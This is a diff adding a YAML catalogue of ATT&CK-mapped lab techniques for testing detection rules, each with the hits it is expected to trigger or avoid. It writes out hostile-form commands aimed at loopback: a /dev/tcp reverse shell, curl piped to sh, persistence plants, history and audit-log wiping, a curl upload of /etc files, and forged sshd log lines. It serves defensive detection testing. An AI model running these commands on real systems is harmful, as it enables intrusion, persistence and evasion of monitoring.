@@ -1,0 +1,514 @@
+techniques:
+- id: revshell-devtcp
+  title: Bash /dev/tcp reverse shell
+  mitre:
+  - T1059.004
+  - T1571
+  command: bash -c 'exec 3<>/dev/tcp/127.0.0.1/4444 && echo sigdiff-hand >&3 && exec 3<&- && exec
+    3>&-' 2>/dev/null || true
+  needs_root: false
+  expect_hits:
+  - revshell-bash-devtcp
+  - suspicious-outbound-4444
+  forbid_hits:
+  - ld-preload-modified
+  - ssh-accepted-external
+  - systemd-unit-created
+  allow_replay: false
+- id: revshell-python
+  title: Python socket connect (hand-rolled backconnect)
+  mitre:
+  - T1090
+  - T1571
+  command: python3 -c 'import socket;s=socket.socket();s.connect(("127.0.0.1",1337))' 2>/dev/null
+    || true
+  needs_root: false
+  expect_hits:
+  - revshell-python-socket
+  - suspicious-outbound-1337
+  forbid_hits:
+  - curl-pipe-shell
+  - setuid-bit-granted
+  allow_replay: false
+- id: curl-pipe-sh
+  title: curl fetched script piped to sh
+  mitre:
+  - T1105
+  command: python3 -m http.server 8099 --bind 127.0.0.1 >/dev/null 2>&1 & SRV=$!; sleep 0.5; echo
+    'echo sigdiff-executed' > fetchme.sh && curl -s http://127.0.0.1:8099/fetchme.sh | sh; kill $SRV
+    2>/dev/null
+  needs_root: false
+  expect_hits:
+  - curl-pipe-shell
+  - ingress-tool-transfer
+  - lab-http-channel
+  - lab-artifact-created
+  forbid_hits:
+  - setuid-bit-granted
+  - ld-preload-modified
+  allow_replay: false
+- id: base64-stage
+  title: base64-decoded payload string
+  mitre:
+  - T1140
+  command: base64 -d <<< 'ZWNobyBzaWdkaWZmLXN0YWdl' > staged.sh && sh staged.sh
+  needs_root: false
+  expect_hits:
+  - base64-decoded-exec
+  - lab-artifact-created
+  forbid_hits:
+  - suspicious-outbound-4444
+  - bashrc-modified
+  allow_replay: false
+- id: history-shred
+  title: Bash history file written then removed
+  mitre:
+  - T1070.003
+  command: echo sigdiff-cmd >> /home/meowman/.bash_history && rm -f /home/meowman/.bash_history
+  needs_root: false
+  expect_hits:
+  - rm-shell-history
+  - history-file-deleted
+  forbid_hits:
+  - ld-preload-modified
+  - ssh-failed-password
+  allow_replay: false
+- id: history-env
+  title: HISTFILE neutered inside a shell
+  mitre:
+  - T1070.003
+  command: bash -c 'HISTFILE=/dev/null; history -c; unset HISTFILE'
+  needs_root: false
+  expect_hits:
+  - history-env-modified
+  forbid_hits:
+  - rm-shell-history
+  - authorized-keys-modified
+  allow_replay: false
+- id: discovery-basic
+  title: whoami / id / uname / hostname
+  mitre:
+  - T1033
+  - T1087.001
+  - T1082
+  command: whoami; id; uname -a; hostname
+  needs_root: false
+  expect_hits:
+  - recon-whoami-id
+  forbid_hits:
+  - revshell-bash-devtcp
+  - ssh-session-opened
+  allow_replay: false
+- id: discovery-netinfo
+  title: ip addr + ss enumeration
+  mitre:
+  - T1016
+  - T1049
+  command: ip addr; ss -ant
+  needs_root: false
+  expect_hits:
+  - recon-ip-address
+  - recon-socket-enumeration
+  forbid_hits:
+  - suspicious-outbound-4444
+  - cron-file-created
+  allow_replay: false
+- id: discovery-nmap
+  title: nmap port probe against loopback
+  mitre:
+  - T1046
+  command: nmap -Pn --max-retries 1 -p 9,19 127.0.0.1 >/dev/null 2>&1 || true
+  needs_root: false
+  expect_hits:
+  - recon-nmap-scan
+  forbid_hits:
+  - revshell-bash-devtcp
+  - setuid-bit-granted
+  allow_replay: false
+- id: sniff-tcpdump
+  title: tcpdump on loopback
+  mitre:
+  - T1040
+  command: tcpdump -c 3 -i lo -nn -w /tmp/sigdiff-lab/work/sigdiff-sniff.pcap 2>/dev/null || true;
+    rm -f /tmp/sigdiff-lab/work/sigdiff-sniff.pcap
+  needs_root: true
+  expect_hits:
+  - network-sniffing-tcpdump
+  - lab-artifact-created
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-1337
+  - lab-unit-started
+  allow_replay: false
+- id: module-load
+  title: modprobe/rmmod a harmless module
+  mitre:
+  - T1547.006
+  command: modprobe loop 2>/dev/null || true; rmmod loop 2>/dev/null || true; ls /tmp/sigdiff-lab
+    >/dev/null
+  needs_root: true
+  expect_hits:
+  - kernel-module-load
+  - kernel-module-unload
+  - sudo-command-executed
+  forbid_hits:
+  - ssh-accepted-password
+  - cron-file-created
+  allow_replay: false
+- id: sysctl-tweak
+  title: sysctl -w live kernel parameter change
+  mitre:
+  - T1547
+  command: sysctl -w kernel.shm_rmid_forced=1 >/dev/null; sysctl -w kernel.shm_rmid_forced=0 >/dev/null
+  needs_root: true
+  expect_hits:
+  - sysctl-modification
+  - sudo-command-executed
+  forbid_hits:
+  - kernel-module-load
+  - authorized-keys-modified
+  allow_replay: false
+- id: firewall-insert
+  title: iptables rule inserted then removed
+  mitre:
+  - T1562.004
+  command: iptables -I INPUT -s 203.0.113.0/24 -j DROP && iptables -D INPUT -s 203.0.113.0/24 -j DROP
+  needs_root: true
+  expect_hits:
+  - firewall-rule-added
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-4444
+  - bashrc-modified
+  allow_replay: false
+- id: account-lifecycle
+  title: useradd -> usermod -> userdel
+  mitre:
+  - T1136.001
+  - T1098
+  - T1531
+  command: useradd -M sigdiff-lab-u 2>/dev/null; usermod -aG users sigdiff-lab-u; userdel -r sigdiff-lab-u
+    2>/dev/null || true
+  needs_root: true
+  expect_hits:
+  - account-create-useradd
+  - account-modify-usermod
+  - account-delete-userdel
+  - passwd-file-modified
+  - shadow-file-modified
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-1337
+  - ld-preload-modified
+  allow_replay: false
+- id: priv-elev-sudo
+  title: plain sudo execution
+  mitre:
+  - T1548.003
+  command: id -u; ls /tmp/sigdiff-lab >/dev/null
+  needs_root: true
+  expect_hits:
+  - privilege-elevation-sudo
+  - sudo-command-executed
+  forbid_hits:
+  - firewall-rule-added
+  - authorized-keys-modified
+  allow_replay: false
+- id: persist-ldpreload
+  title: /etc/ld.so.preload planted then removed
+  mitre:
+  - T1546.006
+  command: touch /tmp/sigdiff-lab/work/sigdiff-hook.so && echo /tmp/sigdiff-lab/work/sigdiff-hook.so
+    > /etc/ld.so.preload && rm /etc/ld.so.preload
+  needs_root: true
+  expect_hits:
+  - ld-preload-modified
+  - ld-preload-deleted
+  - lab-artifact-created
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-4444
+  - ssh-failed-password
+  allow_replay: false
+- id: persist-cron
+  title: cron.d entry planted then removed
+  mitre:
+  - T1053.003
+  command: 'echo ''* * * * * root /bin/true # sigdiff-lab'' > /etc/cron.d/sigdiff-lab && rm /etc/cron.d/sigdiff-lab'
+  needs_root: true
+  expect_hits:
+  - cron-file-created
+  - cron-file-removed
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-1337
+  - bashrc-modified
+  allow_replay: false
+- id: persist-sudoersd
+  title: sudoers drop-in created then removed
+  mitre:
+  - T1548.003
+  command: 'echo ''Defaults lecture="never" # sigdiff-lab'' > /etc/sudoers.d/sigdiff-lab && rm /etc/sudoers.d/sigdiff-lab'
+  needs_root: true
+  expect_hits:
+  - sudoers-dropin-created
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-4444
+  - cron-file-created
+  allow_replay: false
+- id: persist-unit
+  title: systemd unit planted, started, stopped, removed
+  mitre:
+  - T1543.002
+  command: printf '[Unit]\nDescription=sigdiff lab probe\n[Service]\nExecStart=/bin/sleep 60\n' >
+    /etc/systemd/system/sigdiff-lab-probe.service && systemctl daemon-reload && systemctl start sigdiff-lab-probe.service
+    && sleep 0.5 && systemctl stop sigdiff-lab-probe.service && rm /etc/systemd/system/sigdiff-lab-probe.service
+    && systemctl daemon-reload
+  needs_root: true
+  expect_hits:
+  - systemd-unit-created
+  - systemd-unit-removed
+  - lab-unit-started
+  - lab-unit-stopped
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-1337
+  - ssh-accepted-password
+  allow_replay: false
+- id: persist-sshkey
+  title: authorized_keys appended then cleaned
+  mitre:
+  - T1098.004
+  command: mkdir -p /home/meowman/.ssh && chmod 700 /home/meowman/.ssh; ssh-keygen -q -t ed25519 -N
+    '' -f sigdiff-lab-key >/dev/null 2>&1 && cat sigdiff-lab-key.pub >> /home/meowman/.ssh/authorized_keys;
+    rm -f /home/meowman/.ssh/authorized_keys sigdiff-lab-key sigdiff-lab-key.pub
+  needs_root: false
+  expect_hits:
+  - authorized-keys-modified
+  - authorized-keys-removed
+  - lab-artifact-created
+  forbid_hits:
+  - suspicious-outbound-4444
+  - shadow-file-modified
+  allow_replay: false
+- id: persist-bashrc
+  title: shell rc line appended, then rewritten out
+  mitre:
+  - T1546.004
+  command: echo '# sigdiff-lab-marker' >> /home/meowman/.bashrc && grep -v sigdiff-lab-marker /home/meowman/.bashrc
+    > rc.tmp && cat rc.tmp > /home/meowman/.bashrc && rm rc.tmp
+  needs_root: false
+  expect_hits:
+  - bashrc-modified
+  forbid_hits:
+  - suspicious-outbound-1337
+  - ld-preload-modified
+  allow_replay: false
+- id: collect-tar
+  title: tar of /etc files staged for exfil
+  mitre:
+  - T1560.001
+  - T1005
+  command: tar -czf sigdiff-collect.tgz /etc/hostname /etc/hosts
+  needs_root: false
+  expect_hits:
+  - archive-collected-data
+  - collection-etc-sources
+  - lab-artifact-created
+  forbid_hits:
+  - suspicious-outbound-4444
+  - authorized-keys-modified
+  allow_replay: false
+- id: exfil-upload
+  title: curl -T upload to the lab channel
+  mitre:
+  - T1041
+  command: python3 -m http.server 8099 --bind 127.0.0.1 >/dev/null 2>&1 & SRV=$!; sleep 0.5; tar -czf
+    sigdiff-collect.tgz /etc/hostname && curl -s -T sigdiff-collect.tgz http://127.0.0.1:8099/upload.html;
+    kill $SRV 2>/dev/null; true
+  needs_root: false
+  expect_hits:
+  - exfil-upload-curl
+  - ingress-tool-transfer
+  - lab-http-channel
+  - archive-collected-data
+  - collection-etc-sources
+  - lab-artifact-created
+  forbid_hits:
+  - ssh-failed-password
+  - lab-unit-started
+  allow_replay: false
+- id: chmod-777
+  title: world-writable mode set on lab file
+  mitre:
+  - T1222.002
+  command: echo sigdiff > blob.bin && chmod 777 blob.bin
+  needs_root: false
+  expect_hits:
+  - chmod-world-writable
+  - lab-artifact-created
+  forbid_hits:
+  - setuid-bit-granted
+  - suspicious-outbound-1337
+  allow_replay: false
+- id: setuid-copy
+  title: setuid bit granted on a copied binary
+  mitre:
+  - T1548.001
+  command: cp /bin/sleep sg-sleep && chmod u+s sg-sleep && rm -f sg-sleep
+  needs_root: false
+  expect_hits:
+  - setuid-bit-granted
+  - lab-artifact-created
+  forbid_hits:
+  - chmod-world-writable
+  - bashrc-modified
+  allow_replay: false
+- id: kill-agent
+  title: pkill against a non-existent agent name
+  mitre:
+  - T1562.001
+  command: pkill -9 -x sigdiff-agent-absent 2>/dev/null || true
+  needs_root: false
+  expect_hits:
+  - security-software-kill
+  forbid_hits:
+  - lab-unit-stopped
+  - suspicious-outbound-4444
+  allow_replay: false
+- id: dmesg-clear
+  title: kernel ring buffer cleared
+  mitre:
+  - T1562.002
+  command: dmesg -C; ls /tmp/sigdiff-lab >/dev/null
+  needs_root: true
+  expect_hits:
+  - dmesg-cleared
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-1337
+  - cron-file-created
+  allow_replay: false
+- id: log-tamper-lab
+  title: lab log file created then deleted
+  mitre:
+  - T1070.002
+  command: echo sigdiff-line > /var/log/sigdiff-lab/sigdiff-run.log && rm /var/log/sigdiff-lab/sigdiff-run.log
+  needs_root: true
+  expect_hits:
+  - lab-log-created
+  - lab-log-deleted
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-4444
+  - authorized-keys-modified
+  allow_replay: false
+- id: mount-loop
+  title: loop-mount image then unmount
+  mitre:
+  - T1083
+  command: truncate -s 4M sigdiff-disk.img && mkdir -p mnt && mount -o loop sigdiff-disk.img mnt &&
+    umount mnt; rm -f sigdiff-disk.img
+  needs_root: true
+  expect_hits:
+  - mount-loop-image
+  - lab-artifact-created
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-1337
+  - bashrc-modified
+  allow_replay: false
+- id: ssh-inject-login
+  title: forged sshd accepted-login lines (TEST-NET client)
+  mitre:
+  - T1078.004
+  command: 'logger -t sshd ''Accepted password for sigdiff-user from 203.0.113.10 port 40022 ssh2''
+    && logger -t sshd ''pam_unix(sshd:session): session opened for user sigdiff-user(uid=1000) by
+    (uid=0) (from 203.0.113.10)'''
+  needs_root: false
+  expect_hits:
+  - ssh-accepted-password
+  - ssh-accepted-external
+  - ssh-session-opened
+  - logger-exec-injection
+  forbid_hits:
+  - ssh-failed-password
+  - sudo-auth-failed
+  allow_replay: true
+- id: ssh-inject-brute
+  title: forged sshd failures from one TEST-NET source
+  mitre:
+  - T1110.001
+  command: logger -t sshd 'Failed password for invalid user admin from 203.0.113.11 port 41001 ssh2'
+    && logger -t sshd 'Failed password for invalid user admin from 203.0.113.11 port 41002 ssh2' &&
+    logger -t sshd 'Failed password for invalid user admin from 203.0.113.11 port 41003 ssh2'
+  needs_root: false
+  expect_hits:
+  - ssh-failed-password
+  - logger-exec-injection
+  forbid_hits:
+  - ssh-accepted-password
+  - ssh-accepted-external
+  allow_replay: true
+- id: sudo-inject-authfail
+  title: forged sudo auth-failure line
+  mitre:
+  - T1110.001
+  command: 'logger -t sudo ''sigdiff-lab: 3 incorrect password attempts for meowman on tty pts/0 (uid=1000)'''
+  needs_root: false
+  expect_hits:
+  - sudo-auth-failed
+  - logger-exec-injection
+  forbid_hits:
+  - ssh-failed-password
+  - sudo-command-executed
+  allow_replay: true
+- id: control-benign
+  title: 'CONTROL: ordinary user behavior in the lab dir (false-positive check)'
+  mitre: []
+  command: ls -la; date; head -1 /etc/hostname > note.txt; cat note.txt; echo sigdiff >> note.txt;
+    rm note.txt
+  needs_root: false
+  expect_hits:
+  - lab-artifact-created
+  forbid_hits:
+  - revshell-bash-devtcp
+  - curl-pipe-shell
+  - base64-decoded-exec
+  - rm-shell-history
+  - recon-nmap-scan
+  - network-sniffing-tcpdump
+  - account-create-useradd
+  - cron-file-created
+  - chmod-world-writable
+  - setuid-bit-granted
+  - security-software-kill
+  - archive-collected-data
+  - exfil-upload-curl
+  - dmesg-cleared
+  - mount-loop-image
+  - ssh-failed-password
+  - sudo-auth-failed
+  - ld-preload-modified
+  - bashrc-modified
+  - authorized-keys-modified
+  - systemd-unit-created
+  - suspicious-outbound-4444
+  - audit-rules-cleared
+  allow_replay: false
+- id: audit-tamper-last
+  title: 'runtime audit rule churn: add, delete, clear-all'
+  mitre:
+  - T1562.001
+  command: auditctl -a exit,always -F arch=b64 -S execve -F auid=1000 -k sigdiff-temp; auditctl --delete
+    exit,always -F arch=b64 -S execve -F auid=1000 -k sigdiff-temp; auditctl -D; true
+  needs_root: true
+  expect_hits:
+  - audit-rule-added
+  - audit-rules-cleared
+  - sudo-command-executed
+  forbid_hits:
+  - suspicious-outbound-4444
+  - ssh-failed-password
+  allow_replay: false
